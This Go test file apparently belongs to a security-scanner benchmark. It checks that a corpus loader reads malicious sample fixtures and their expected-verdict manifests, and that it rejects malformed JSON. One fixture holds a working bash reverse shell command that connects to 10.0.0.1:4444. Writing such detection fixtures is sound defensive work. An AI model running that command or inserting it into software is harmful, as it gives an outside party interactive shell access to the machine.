package benchmark

import (
	"os"
	"path/filepath"
	"testing"
)

func TestCorpusLoader(t *testing.T) {
	tempDir := t.TempDir()

	// Create subdirectories
	malDir := filepath.Join(tempDir, "malicious", "01_reverse_shells")
	if err := os.MkdirAll(malDir, 0755); err != nil {
		t.Fatalf("Failed to create test dir: %v", err)
	}

	// Create a sample fixture
	sampleScript := `#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
`
	fixturePath := filepath.Join(malDir, "revshell.sh")
	if err := os.WriteFile(fixturePath, []byte(sampleScript), 0644); err != nil {
		t.Fatalf("Failed to write fixture: %v", err)
	}

	// Create a contract manifest
	manifestJSON := `{
		"id": "MAL-REV-001",
		"name": "Bash Reverse Shell",
		"category": "MALICIOUS",
		"subcategory": "reverse_shell_interactive",
		"target_path": "revshell.sh",
		"expected": {
			"verdict": "MALICIOUS",
			"allowed_severities": ["ALERT"],
			"evidence_strength": "StrengthDirect",
			"min_confidence": "HIGH",
			"expected_rules": ["Script_Reverse_Shell_Interactive"]
		}
	}`
	manifestPath := filepath.Join(malDir, "revshell.contract.json")
	if err := os.WriteFile(manifestPath, []byte(manifestJSON), 0644); err != nil {
		t.Fatalf("Failed to write manifest: %v", err)
	}

	loader := NewCorpusLoader(tempDir)
	cases, err := loader.LoadAll()
	if err != nil {
		t.Fatalf("Loader failed: %v", err)
	}

	if len(cases) != 1 {
		t.Fatalf("Expected 1 case, got %d", len(cases))
	}

	c := cases[0]
	if c.ID != "MAL-REV-001" {
		t.Errorf("Expected ID MAL-REV-001, got %s", c.ID)
	}

	// Check path normalization (must be relative to tempDir)
	expectedRelPath := "malicious/01_reverse_shells/revshell.sh"
	if c.TargetPath != expectedRelPath {
		t.Errorf("Expected normalized TargetPath %q, got %q", expectedRelPath, c.TargetPath)
	}

	if string(c.FixtureContent) != sampleScript {
		t.Errorf("Fixture content mismatch: %s", string(c.FixtureContent))
	}
}

func TestCorpusLoader_MalformedJSON(t *testing.T) {
	tempDir := t.TempDir()
	badJSON := `{ "id": "BAD", invalid json `
	manifestPath := filepath.Join(tempDir, "bad.contract.json")
	if err := os.WriteFile(manifestPath, []byte(badJSON), 0644); err != nil {
		t.Fatalf("Failed to write bad manifest: %v", err)
	}

	loader := NewCorpusLoader(tempDir)
	_, err := loader.LoadAll()
	if err == nil {
		t.Errorf("Expected error for malformed JSON, got nil")
	}
}
